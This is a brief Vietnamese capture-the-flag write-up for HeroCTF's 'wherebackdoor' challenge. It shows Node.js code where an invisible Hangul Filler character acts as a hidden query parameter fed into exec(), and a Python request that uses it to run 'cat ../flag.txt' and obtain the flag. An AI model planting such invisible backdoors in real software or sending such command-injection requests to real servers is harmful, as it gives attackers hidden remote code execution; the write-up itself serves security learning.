# HeroCTF- wherebackdoor

**Description**: Quên rồi nhưng mà tựa là hacker đã hack vào hệ thống và để lại 1 backdoor, mày tim được cái backdoor này không??

Challenges cho source-code:
```js
// .............
app.get('/server_health', cors(corsOptions), async (req, res) => {
    var { timeout,ㅤ} = req.query;
    const checkCommands = [
        '/bin/bash /home/player/scripts/fileIntegrity.sh',
        '/bin/bash /home/player/scripts/isUp.sh localhost:80',
        '/bin/bash /home/player/scripts/isUp.sh localhost:3000',ㅤ
    ];
// ............
output = ""
        await Promise.all(checkCommands.map(async (cmd) => {
            try {
                r = await exec(cmd, { timeout: t });
                output += r.stdout.trim() || r.stderr.trim();
            } catch (err) {
                output += "";
            }
            output += "\n"
        }));
// ...........
```

**Tham khảo**: https://certitude.consulting/blog/en/invisible-backdoor/

=> Dùng "HANGUL FILLER" để dấu backdoor
```
const { timeout,\u3164} = req.query;
// .....

const checkCommands = [
        'ping -c 1 google.com',
        'curl -s http://example.com/',\u3164
    ];
```
Ở đây hacker dùng "HANGUL FILLER" để dấu backdoor, sau đó mỗi lần muốn RCE chỉ cần nạp command vào kí tự này hay tham số này, tham số này sẽ nằm ẩn trong mảng checkCommands mà dev không thể thấy đợi được nạp vào `exec()`


```python
import requests

url = 'https://apibackdoor.web.heroctf.fr'

r = requests.get(url+'/server_health?\u3164=cat ../flag.txt')

print(r.text)
```

**flag**: `Hero{1nv1s1b1e_b4ckd0or_w7f}`
